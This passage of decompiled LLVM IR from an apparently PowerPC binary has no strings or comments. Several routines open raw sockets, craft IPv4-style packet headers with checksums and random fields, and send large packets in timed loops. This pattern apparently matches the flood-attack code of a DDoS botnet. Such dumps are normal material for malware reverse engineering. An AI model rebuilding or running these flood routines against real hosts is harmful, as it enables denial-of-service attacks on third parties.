  %v1_10002004.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10001ff4 ], [ %extract.t41, %dec_label_pc_10002014 ]
  store i16 %v1_10002004.sink.off0, i16* %v4_10002024, align 2
  %v3_10002034 = call i32 @function_10000e28(i16* %v2_10002034, i32 1500)
  %sext3 = mul i32 %v3_10002034, 65536
  %v1_10002038 = sdiv i32 %sext3, 65536
  %v1_10002040 = trunc i32 %v1_10002038 to i16
  store i16 %v1_10002040, i16* %v4_10002040, align 2
  %v0_10002044 = call i32 @function_1000066c()
  store i32 %v0_10002044, i32* %v3_10002050, align 4
  store i32 268443736, i32* @lr, align 4
  %v0_10002054 = call i32 @function_100086d4()
  %v1_10002064 = trunc i32 %v0_10002054 to i16
  store i16 %v1_10002064, i16* %v4_10002064, align 4
  %v3_10002074 = call i32 @function_10000e28(i16* %v2_10002034, i32 1500)
  %v1_10002080 = trunc i32 %v3_10002074 to i16
  store i16 %v1_10002080, i16* %v4_10002080, align 2
  store i32 268443832, i32* @lr, align 4
  %v6_100020b4 = call i32 @function_10007fec(i32 %v3_10001e3c, i32 %v2_10001ee0, i32 1500, i32 0, i32 %v2_10002094, i32 16)
  %tmp34 = icmp ult i32 %stack_var_-1560.0, 50
  br i1 %tmp34, label %dec_label_pc_100020f8, label %dec_label_pc_100020c4

dec_label_pc_100020c4:                            ; preds = %dec_label_pc_10002028
  store i32 268443852, i32* @lr, align 4
  %v1_100020c8 = call i32 @function_10004d80(i32 0)
  %v2_100020e0 = icmp ult i32 %v1_100020c8, %v2_100020dc
  br i1 %v2_100020e0, label %dec_label_pc_100020f0, label %dec_label_pc_100020e8

dec_label_pc_100020e8:                            ; preds = %dec_label_pc_100020c4
  %v0_100020ec = call i32 @function_10008dd4()
  br label %dec_label_pc_100020f0

dec_label_pc_100020f0:                            ; preds = %dec_label_pc_100020c4, %dec_label_pc_100020e8
  br label %dec_label_pc_100020f8

dec_label_pc_100020f8:                            ; preds = %dec_label_pc_10002028, %dec_label_pc_100020f0
  %stack_var_-1560.1 = phi i32 [ %stack_var_-1560.0, %dec_label_pc_10002028 ], [ 0, %dec_label_pc_100020f0 ]
  %v1_100020fc = add i32 %stack_var_-1560.1, 1
  br label %dec_label_pc_10001fd4

dec_label_pc_10002108:                            ; preds = %dec_label_pc_10001de0
  ret i32 %v1_10001e20

; uselistorder directives
  uselistorder i32 %v1_10001ff8, { 1, 0 }
  uselistorder i32 %v1_10001fac, { 1, 0 }
  uselistorder i32 %v2_10001ee0, { 9, 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %stack_var_-1536, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-1552, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100020f8, { 1, 0 }
  uselistorder label %dec_label_pc_100020f0, { 1, 0 }
  uselistorder label %dec_label_pc_10002028, { 1, 0 }
  uselistorder label %dec_label_pc_10001e88, { 1, 0 }
  uselistorder label %dec_label_pc_10001e5c, { 1, 0 }
}

define i32 @function_10002120(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002120:
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v2_1000214c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_1000214c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000d8f4.83 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10002164.84 to i32), i32* @lr, align 4
  %v0_10002160 = call i32 @function_10007104()
  store i32 268444028, i32* @lr, align 4
  %v1_10002178 = call i32 @function_10004d80(i32 0)
  %v1_10002188 = call i32 @function_100004f0(i32 %arg2)
  %v3_10002190 = icmp eq i32 %v1_10002188, 0
  br i1 %v3_10002190, label %dec_label_pc_10002198, label %dec_label_pc_10002608

dec_label_pc_10002198:                            ; preds = %dec_label_pc_10002120
  %v2_1000219c = icmp sgt i32 %arg3, 2
  br i1 %v2_1000219c, label %dec_label_pc_100021c4, label %dec_label_pc_100021a4

dec_label_pc_100021a4:                            ; preds = %dec_label_pc_10002198
  %v5_100021b8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d944.85 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100021c0 = call i32 @function_10008dd4()
  br label %dec_label_pc_100021c4

dec_label_pc_100021c4:                            ; preds = %dec_label_pc_10002198, %dec_label_pc_100021a4
  store i32 268444116, i32* @lr, align 4
  %v3_100021d0 = call i32 @function_10008068(i32 2, i32 3, i32 255)
  %tmp71 = icmp sgt i32 %v3_100021d0, -1
  br i1 %tmp71, label %dec_label_pc_10002234.preheader, label %dec_label_pc_100021e8

dec_label_pc_100021e8:                            ; preds = %dec_label_pc_100021c4
  %v0_100021ec = call i32 @function_10008dd4()
  br label %dec_label_pc_10002234.preheader

dec_label_pc_10002234.preheader:                  ; preds = %dec_label_pc_100021c4, %dec_label_pc_100021e8
  store i32 0, i32* %stack_var_-280, align 4
  %v2_10002208 = ptrtoint i32* %stack_var_-280 to i32
  %v2_1000220c = add i32 %v2_10002208, 168
  %v2_10002220 = add i32 %v2_10002208, 80
  br label %dec_label_pc_100021fc

dec_label_pc_100021fc:                            ; preds = %dec_label_pc_10002234.preheader, %dec_label_pc_100021fc
  %v3_100021fc = phi i32 [ 0, %dec_label_pc_10002234.preheader ], [ %v1_1000222c, %dec_label_pc_100021fc ]
  %v1_10002204 = mul i32 %v3_100021fc, 4
  %v1_10002210 = add i32 %v2_1000220c, %v1_10002204
  %v1_10002214 = inttoptr i32 %v1_10002210 to i32*
  %v2_10002214 = load i32, i32* %v1_10002214, align 4
  %v1_10002224 = trunc i32 %v2_10002214 to i8
  %v3_10002224 = add i32 %v2_10002220, %v3_100021fc
  %v4_10002224 = inttoptr i32 %v3_10002224 to i8*
  store i8 %v1_10002224, i8* %v4_10002224, align 1
  %v3_10002228 = load i32, i32* %stack_var_-280, align 4
  %v1_1000222c = add i32 %v3_10002228, 1
  store i32 %v1_1000222c, i32* %stack_var_-280, align 4
  %tmp72 = icmp slt i32 %v1_1000222c, 20
  br i1 %tmp72, label %dec_label_pc_100021fc, label %dec_label_pc_10002240

dec_label_pc_10002240:                            ; preds = %dec_label_pc_100021fc
  %v1_10002244 = add i32 %arg4, 4
  %v1_10002248 = inttoptr i32 %v1_10002244 to i32*
  %v2_10002248 = load i32, i32* %v1_10002248, align 4
  store i32 268444248, i32* @lr, align 4
  %v3_10002254 = call i32 @function_10001d04(i32 %arg2, i32 %v2_10002248, i32 %v1_10002244)
  %v1_10002264 = add i32 %arg4, 12
  %v1_10002268 = inttoptr i32 %v1_10002264 to i32*
  %v2_10002268 = load i32, i32* %v1_10002268, align 4
  store i32 268444276, i32* @lr, align 4
  %v2_10002270 = inttoptr i32 %v2_10002268 to i8*
  %v3_10002270 = call i32 @function_10008c0c(i8* %v2_10002270, i32 %v1_10002264)
  %v2_10002284 = load i32, i32* %v1_10002248, align 4
  %v6_100022a0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d96c.89 to i32), i32 %arg2, i32 %v2_10002284)
  %v1_100022ac = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v1_100022bc = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_100022bc, i32* %stack_var_-240, align 4
  %v1_100022f4 = call i32 @__asm_rlwimi(i32 10, i32 24, i32 4, i32 7)
  %v1_10002304 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002310 = call i32 @__asm_rlwinm(i32 %v1_10002304, i32 0, i32 16, i32 14)
  %v1_1000231c = call i32 @__asm_rlwinm(i32 %v1_10002310, i32 0, i32 15, i32 13)
  %v1_10002328 = call i32 @__asm_rlwinm(i32 %v1_1000231c, i32 0, i32 14, i32 12)
  %v1_10002334 = call i32 @__asm_rlwinm(i32 %v1_10002328, i32 0, i32 13, i32 11)
  %v1_10002340 = call i32 @__asm_rlwinm(i32 %v1_10002334, i32 0, i32 12, i32 10)
  %v1_1000234c = call i32 @__asm_rlwinm(i32 %v1_10002340, i32 0, i32 11, i32 9)
  %v1_10002358 = call i32 @__asm_rlwinm(i32 %v1_1000234c, i32 0, i32 9, i32 7)
  %v1_10002380 = add i32 %arg4, 8
  %v1_10002384 = inttoptr i32 %v1_10002380 to i32*
  %v2_10002384 = load i32, i32* %v1_10002384, align 4
  store i32 268444560, i32* @lr, align 4
  %v2_1000238c = inttoptr i32 %v2_10002384 to i8*
  %v3_1000238c = call i32 @function_10008c0c(i8* %v2_1000238c, i32 %v1_10002380)
  %v1_10002394 = urem i32 %v3_1000238c, 65536
  store i32 %v1_10002394, i32* @r3, align 4
  %v1_1000239c = call i32 @function_100079f0(i32 %v1_10002394)
  %v2_1000247c = ptrtoint i32* %stack_var_-240 to i32
  %v2_10002488 = bitcast i32* %stack_var_-240 to i16*
  %v2_10002530 = ptrtoint i32* %stack_var_-220 to i32
  %v2_10002534 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10002538 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002550 = ptrtoint i32* %stack_var_-200 to i32
  %v2_10002558 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002580 = bitcast i32* %stack_var_-180 to i16*
  %v2_10002594 = ptrtoint i32* %stack_var_-128 to i32
  %v2_100025dc = add i32 %v3_10002270, %v1_10002178
  br label %dec_label_pc_100023a8

dec_label_pc_100023a8:                            ; preds = %dec_label_pc_100025f8, %dec_label_pc_10002240
  %stack_var_-244.0 = phi i32 [ 0, %dec_label_pc_10002240 ], [ %v1_100025fc, %dec_label_pc_100025f8 ]
  store i32 268444588, i32* @lr, align 4
  %v0_100023a8 = call i32 @function_100086d4()
  %v2_100023bc = load i32, i32* %v1_10002384, align 4
  store i32 268444616, i32* @lr, align 4
  %v2_100023c4 = inttoptr i32 %v2_100023bc to i8*
  %v3_100023c4 = call i32 @function_10008c0c(i8* %v2_100023c4, i32 %v1_10002380)
  %v3_100023cc = icmp eq i32 %v3_100023c4, 0
  br i1 %v3_100023cc, label %dec_label_pc_100023d4, label %dec_label_pc_100023e0

dec_label_pc_100023d4:                            ; preds = %dec_label_pc_100023a8
  store i32 268444632, i32* @lr, align 4
  %v0_100023d4 = call i32 @function_100086d4()
  br label %dec_label_pc_100023e0

dec_label_pc_100023e0:                            ; preds = %dec_label_pc_100023a8, %dec_label_pc_100023d4
  %v0_100023e0 = call i32 @function_1000066c()
  store i32 60, i32* @r3, align 4
  %v1_10002400 = call i32 @function_100079f0(i32 60)
  store i32 268444688, i32* @lr, align 4
  %v0_1000240c = call i32 @function_100086d4()
  %v1_10002438 = urem i32 %v0_100023a8, 65536
  store i32 %v1_10002438, i32* %stack_var_-220, align 4
  store i32 268444752, i32* @lr, align 4
  %v0_1000244c = call i32 @function_100086d4()
  store i32 2, i32* %stack_var_-128, align 4
  %v3_10002488 = call i32 @function_10000e28(i16* %v2_10002488, i32 20)
  store i32 268444824, i32* @lr, align 4
  %v0_10002494 = call i32 @function_100086d4()
  store i32 %v0_100023e0, i32* %stack_var_-180, align 4
  store i32 40, i32* @r3, align 4
  %v1_10002520 = call i32 @function_100079f0(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000254c.90 to i32), i32* @lr, align 4
  %v4_10002548 = call i32 @function_100076fc(i32 %v2_10002530, i32 %v2_10002538, i32 20, i32 %v2_10002534)
  store i32 20, i32* @r5, align 4
  store i32 268445036, i32* @lr, align 4
  %v4_10002568 = call i32 @function_100076fc(i32 %v2_10002550, i32 %v2_10002558, i32 20, i32 %v2_10002534)
  %v3_10002580 = call i32 @function_10000e28(i16* %v2_10002580, i32 52)
  store i32 268445112, i32* @lr, align 4
  %v6_100025b4 = call i32 @function_10007fec(i32 %v3_100021d0, i32 %v2_1000247c, i32 60, i32 0, i32 %v2_10002594, i32 16)
  %tmp73 = icmp ult i32 %stack_var_-244.0, 50
  br i1 %tmp73, label %dec_label_pc_100025f8, label %dec_label_pc_100025c4

dec_label_pc_100025c4:                            ; preds = %dec_label_pc_100023e0
  store i32 268445132, i32* @lr, align 4
  %v1_100025c8 = call i32 @function_10004d80(i32 0)
  %v2_100025e0 = icmp ult i32 %v1_100025c8, %v2_100025dc
  br i1 %v2_100025e0, label %dec_label_pc_100025f0, label %dec_label_pc_100025e8

dec_label_pc_100025e8:                            ; preds = %dec_label_pc_100025c4
  %v0_100025ec = call i32 @function_10008dd4()
  br label %dec_label_pc_100025f0

dec_label_pc_100025f0:                            ; preds = %dec_label_pc_100025c4, %dec_label_pc_100025e8
  br label %dec_label_pc_100025f8

dec_label_pc_100025f8:                            ; preds = %dec_label_pc_100023e0, %dec_label_pc_100025f0
  %stack_var_-244.1 = phi i32 [ %stack_var_-244.0, %dec_label_pc_100023e0 ], [ 0, %dec_label_pc_100025f0 ]
  %v1_100025fc = add i32 %stack_var_-244.1, 1
  br label %dec_label_pc_100023a8

dec_label_pc_10002608:                            ; preds = %dec_label_pc_10002120
  ret i32 %v1_10002188

; uselistorder directives
  uselistorder i32 %v2_10002534, { 1, 0 }
  uselistorder i32 %v1_10002394, { 1, 0 }
  uselistorder i32 %v1_1000222c, { 1, 2, 0 }
  uselistorder i32 %v3_100021fc, { 1, 0 }
  uselistorder i32* %stack_var_-280, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2 }
  uselistorder i32 60, { 2, 4, 3, 6, 1, 7, 8, 0, 5 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100025f8, { 1, 0 }
  uselistorder label %dec_label_pc_100025f0, { 1, 0 }
  uselistorder label %dec_label_pc_100023e0, { 1, 0 }
  uselistorder label %dec_label_pc_100021fc, { 1, 0 }
  uselistorder label %dec_label_pc_10002234.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100021c4, { 1, 0 }
}

define i32 @function_10002620(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10002620:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 268445272, i32* @lr, align 4
  %v1_10002654 = call i32 @function_10004d80(i32 0)
  %v1_10002664 = call i32 @function_100004f0(i32 %arg2)
  %v3_1000266c = icmp eq i32 %v1_10002664, 0
  br i1 %v3_1000266c, label %dec_label_pc_10002674, label %dec_label_pc_10002a44

dec_label_pc_10002674:                            ; preds = %dec_label_pc_10002620
  %v2_10002678 = icmp sgt i32 %arg3, 1
  br i1 %v2_10002678, label %dec_label_pc_100026a0, label %dec_label_pc_10002680

dec_label_pc_10002680:                            ; preds = %dec_label_pc_10002674
  %v5_10002694 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1000d984.92 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_1000269c = call i32 @function_10008dd4()
  br label %dec_label_pc_100026a0

dec_label_pc_100026a0:                            ; preds = %dec_label_pc_10002674, %dec_label_pc_10002680
  %v1_100026a4 = add i32 %arg4, 8
  %v1_100026a8 = inttoptr i32 %v1_100026a4 to i32*
  %v2_100026a8 = load i32, i32* %v1_100026a8, align 4
  store i32 268445364, i32* @lr, align 4
  %v2_100026b0 = inttoptr i32 %v2_100026a8 to i8*
  %v3_100026b0 = call i32 @function_10008c0c(i8* %v2_100026b0, i32 %v1_100026a4)
  store i32 268445388, i32* @lr, align 4
  %v3_100026c8 = call i32 @function_10008068(i32 2, i32 3, i32 255)
  %tmp60 = icmp sgt i32 %v3_100026c8, -1
  br i1 %tmp60, label %dec_label_pc_100026e8, label %dec_label_pc_100026e0

dec_label_pc_100026e0:                            ; preds = %dec_label_pc_100026a0
  %v0_100026e4 = call i32 @function_10008dd4()
  br label %dec_label_pc_100026e8

dec_label_pc_100026e8:                            ; preds = %dec_label_pc_100026a0, %dec_label_pc_100026e0
  store i32 268445424, i32* @lr, align 4
  %v1_100026ec = call i32 @function_10004d80(i32 0)
  store i32 268445432, i32* @lr, align 4
  %v0_100026f4 = call i32 @function_10004c60()
  %v2_100026fc = xor i32 %v1_100026ec, %v0_100026f4
  store i32 ptrtoint (i32* @global_var_10002708.95 to i32), i32* @lr, align 4
  %v1_10002704 = call i32 @function_10008850(i32 %v2_100026fc)
  store i32 268445452, i32* @lr, align 4
  %v0_10002708 = call i32 @function_100086d4()
  %v2_10002710 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002714 = ptrtoint i32* %stack_var_-128 to i32
  store i32 268445480, i32* @lr, align 4
  %v3_10002724 = call i32 @function_100071a0(i32 %v2_10002714, i32 %v0_10002708, i32 1400)
  %v1_1000272c = add i32 %arg4, 4
  %v1_10002730 = inttoptr i32 %v1_1000272c to i32*
  %v2_10002730 = load i32, i32* %v1_10002730, align 4
  store i32 268445504, i32* @lr, align 4
  %v3_1000273c = call i32 @function_10001d04(i32 %arg2, i32 %v2_10002730, i32 %v1_1000272c)
  %v2_10002750 = load i32, i32* %v1_10002730, align 4
  %v6_1000276c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1000d9a8.96 to i32), i32 %arg2, i32 %v2_10002750)
  %v2_100028fc = bitcast i32* %stack_var_-168 to i16*
  %v2_10002964 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002968 = ptrtoint i32* %stack_var_-108 to i32
  %v2_1000296c = ptrtoint i32* %stack_var_-96 to i32
  %v2_1000298c = ptrtoint i32* %stack_var_-76 to i32
  %v2_100029b4 = bitcast i32* %stack_var_-108 to i16*
  %v2_100029c8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10002a10 = add i32 %v3_100026b0, %v1_10002654
  br label %dec_label_pc_10002770

dec_label_pc_10002770:                            ; preds = %dec_label_pc_10002a24, %dec_label_pc_100026e8
  %stack_var_-180.0 = phi i32 [ %tmp11, %dec_label_pc_100026e8 ], [ %v1_10002a28, %dec_label_pc_10002a24 ]
  %v0_10002770 = call i32 @function_1000066c()
  %v1_10002784 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10002784, i32* %stack_var_-168, align 4
  %v1_10002794 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10002794, i32* %stack_var_-168, align 4
  store i32 1440, i32* @r3, align 4
  %v1_100027b8 = call i32 @function_100079f0(i32 1440)
  store i32 268445640, i32* @lr, align 4
  %v0_100027c4 = call i32 @function_100086d4()
  store i32 268445704, i32* @lr, align 4
  %v0_10002804 = call i32 @function_100086d4()
  %v1_1000280c = urem i32 %v0_10002804, 65536
  store i32 %v1_1000280c, i32* %stack_var_-148, align 4
  store i32 268445720, i32* @lr, align 4
  %v0_10002814 = call i32 @function_100086d4()
  store i32 268445736, i32* @lr, align 4
  %v0_10002824 = call i32 @function_100086d4()
  store i32 268445748, i32* @lr, align 4
  %v0_10002830 = call i32 @function_100086d4()
  %v1_10002844 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10002854 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002860 = call i32 @__asm_rlwinm(i32 %v1_10002854, i32 0, i32 16, i32 14)
  %v1_1000286c = call i32 @__asm_rlwinm(i32 %v1_10002860, i32 0, i32 15, i32 13)
  %v1_10002878 = call i32 @__asm_rlwinm(i32 %v1_1000286c, i32 0, i32 14, i32 12)
  %v1_10002890 = or i32 %v1_10002878, 1572864
  %v1_1000289c = call i32 @__asm_rlwinm(i32 %v1_10002890, i32 0, i32 11, i32 9)
  %v1_100028a8 = call i32 @__asm_rlwinm(i32 %v1_1000289c, i32 0, i32 9, i32 7)
  %v1_100028b4 = call i32 @__asm_rlwinm(i32 %v1_100028a8, i32 0, i32 10, i32 8)
  store i32 2, i32* %stack_var_-56, align 4
  %v3_100028fc = call i32 @function_10000e28(i16* %v2_100028fc, i32 20)
  %v3_10002914 = call i32 @function_10000e28(i16* %v2_100028fc, i32 40)
  store i32 %v0_10002770, i32* %stack_var_-108, align 4
  store i32 1420, i32* @r3, align 4
  %v1_10002954 = call i32 @function_100079f0(i32 1420)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002980.97 to i32), i32* @lr, align 4
  %v4_1000297c = call i32 @function_100076fc(i32 %v2_10002964, i32 %v2_1000296c, i32 20, i32 %v2_10002968)
  store i32 1400, i32* @r5, align 4
  store i32 268446112, i32* @lr, align 4
  %v4_1000299c = call i32 @function_100076fc(i32 %v2_10002714, i32 %v2_1000298c, i32 1400, i32 %v2_10002968)
  %v3_100029b4 = call i32 @function_10000e28(i16* %v2_100029b4, i32 1432)
  store i32 268446188, i32* @lr, align 4
  %v6_100029e8 = call i32 @function_10007fec(i32 %v3_100026c8, i32 %v2_10002710, i32 1440, i32 0, i32 %v2_100029c8, i32 16)
  %tmp61 = icmp ult i32 %stack_var_-180.0, 50
  br i1 %tmp61, label %dec_label_pc_10002a24, label %dec_label_pc_100029f8

dec_label_pc_100029f8:                            ; preds = %dec_label_pc_10002770
  store i32 268446208, i32* @lr, align 4
  %v1_100029fc = call i32 @function_10004d80(i32 0)
  %v2_10002a14 = icmp ult i32 %v1_100029fc, %v2_10002a10
  br i1 %v2_10002a14, label %dec_label_pc_10002a1c, label %dec_label_pc_10002a34

dec_label_pc_10002a1c:                            ; preds = %dec_label_pc_100029f8
  br label %dec_label_pc_10002a24

dec_label_pc_10002a24:                            ; preds = %dec_label_pc_10002770, %dec_label_pc_10002a1c
  %stack_var_-180.1 = phi i32 [ %stack_var_-180.0, %dec_label_pc_10002770 ], [ 0, %dec_label_pc_10002a1c ]
  %v1_10002a28 = add i32 %stack_var_-180.1, 1
  br label %dec_label_pc_10002770

dec_label_pc_10002a34:                            ; preds = %dec_label_pc_100029f8
  store i32 ptrtoint ([3 x i8]* @global_var_10002a3c.98 to i32), i32* @lr, align 4
  %v1_10002a38 = call i32 @function_10004ab4(i32 %v3_100026c8)
  %v0_10002a40 = call i32 @function_10008dd4()
  br label %dec_label_pc_10002a44

dec_label_pc_10002a44:                            ; preds = %dec_label_pc_10002620, %dec_label_pc_10002a34
  %v0_10002a5c = phi i32 [ %v1_10002664, %dec_label_pc_10002620 ], [ %v0_10002a40, %dec_label_pc_10002a34 ]
  ret i32 %v0_10002a5c

; uselistorder directives
  uselistorder i32 %v2_10002968, { 1, 0 }
  uselistorder i32 %v2_10002714, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-108, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10007fec, { 2, 1, 0 }
  uselistorder i32 1420, { 1, 0 }
  uselistorder i32 1440, { 0, 2, 1 }
  uselistorder i32 ()* @function_1000066c, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10001d04, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_100004f0, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002a44, { 1, 0 }
  uselistorder label %dec_label_pc_10002a24, { 1, 0 }
  uselistorder label %dec_label_pc_100026e8, { 1, 0 }
  uselistorder label %dec_label_pc_100026a0, { 1, 0 }
}

define i32 @function_100037d8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100037d8:
  %v3_100037fc = load i32, i32* @global_var_10010474.145, align 4
  %v5_10003814 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000e174.158 to i32), i32 %v3_100037fc, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_1000381c = load i32, i32* @global_var_10010488.143, align 4
  %v3_10003824 = load i32, i32* @global_var_10010484.159, align 4
  %v6_10003840 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000e184.160 to i32), i32 %v3_1000381c, i32 %v3_10003824)
  %v3_10003848 = load i32, i32* @global_var_10010474.145, align 4
  %v5_10003860 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1000e194.161 to i32), i32 %v3_10003848, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_10003860
}

define i32 @function_1000387c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000387c:
  %v5_100038b0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000e19c.162 to i32), i32 %arg3, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_100038b0
}

define i32 @function_100038cc(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_100038cc:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100038cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100038cc, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10003924.preheader

dec_label_pc_1000390c:                            ; preds = %dec_label_pc_1000393c
  %v4_1000393c = ptrtoint i8* %stack_var_-68.058 to i32
  %v1_10003910 = add i32 %v4_1000393c, 1
  %v5_10003914 = inttoptr i32 %v1_10003910 to i8*
  %v1_1000391c = add i32 %stack_var_-60.057, 1
  store i32 %v1_1000391c, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c = call i32 @function_10007284()
  %v0_10003934 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003934 = icmp ult i32 %v0_10003934, %v0_1000392c
  br i1 %v2_10003934, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_1000393c:                            ; preds = %dec_label_pc_10003924.preheader, %dec_label_pc_1000390c
  %stack_var_-68.058 = phi i8* [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.164, %dec_label_pc_10003924.preheader ]
  %stack_var_-60.057 = phi i32 [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.163, %dec_label_pc_10003924.preheader ]
  %v2_10003940 = load i8, i8* %stack_var_-68.058, align 1
  %v3_10003948 = icmp eq i8 %v2_10003940, 32
  br i1 %v3_10003948, label %dec_label_pc_10003950, label %dec_label_pc_1000390c

dec_label_pc_10003950:                            ; preds = %dec_label_pc_1000390c, %dec_label_pc_1000393c, %dec_label_pc_10003924.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.163, %dec_label_pc_10003924.preheader ], [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.057, %dec_label_pc_1000393c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.164, %dec_label_pc_10003924.preheader ], [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.058, %dec_label_pc_1000393c ]
  %v4_10003950 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10003954 = add i32 %v4_10003950, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003964 = call i32 @function_10007284()
  %v0_1000396c = load i32, i32* %r29.global-to-local, align 4
  %v4_1000396c = icmp eq i32 %v0_1000396c, %v0_10003964
  br i1 %v4_1000396c, label %dec_label_pc_10003c2c, label %dec_label_pc_10003974

dec_label_pc_10003974:                            ; preds = %dec_label_pc_10003950
  %v5_10003958 = inttoptr i32 %v1_10003954 to i8*
  %v1_10003978 = add nuw nsw i32 %storemerge965, 1
  %tmp92 = icmp slt i32 %v1_10003978, 5
  br i1 %tmp92, label %dec_label_pc_10003924.preheader, label %dec_label_pc_100039a4.preheader

dec_label_pc_10003924.preheader:                  ; preds = %dec_label_pc_100038cc, %dec_label_pc_10003974
  %storemerge965 = phi i32 [ 0, %dec_label_pc_100038cc ], [ %v1_10003978, %dec_label_pc_10003974 ]
  %stack_var_-68.164 = phi i8* [ %arg3, %dec_label_pc_100038cc ], [ %v5_10003958, %dec_label_pc_10003974 ]
  %stack_var_-60.163 = phi i32 [ 0, %dec_label_pc_100038cc ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10003974 ]
  store i32 %stack_var_-60.163, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c52 = call i32 @function_10007284()
  %v0_1000393453 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000393454 = icmp ult i32 %v0_1000393453, %v0_1000392c52
